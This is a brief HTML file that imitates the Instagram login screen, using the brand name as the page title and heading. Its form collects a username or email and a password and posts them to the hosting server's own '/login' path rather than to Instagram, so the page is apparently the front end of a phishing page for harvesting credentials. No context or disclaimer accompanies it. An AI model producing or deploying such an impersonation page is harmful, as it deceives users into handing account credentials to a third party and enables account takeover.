<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram</title>
  <style>
    body { font-family: sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .container { background: white; padding: 30px; border: 1px solid #ccc; width: 300px; text-align: center; }
    input { display: block; width: 100%; padding: 10px; margin: 10px 0; }
    button { background: #0095f6; color: white; padding: 10px; border: none; width: 100%; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Instagram</h2>
    <form action="/login" method="POST">
      <input type="text" name="username" placeholder="Phone number, username, or email" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Log In</button>
    </form>
  </div>
</body>
</html>
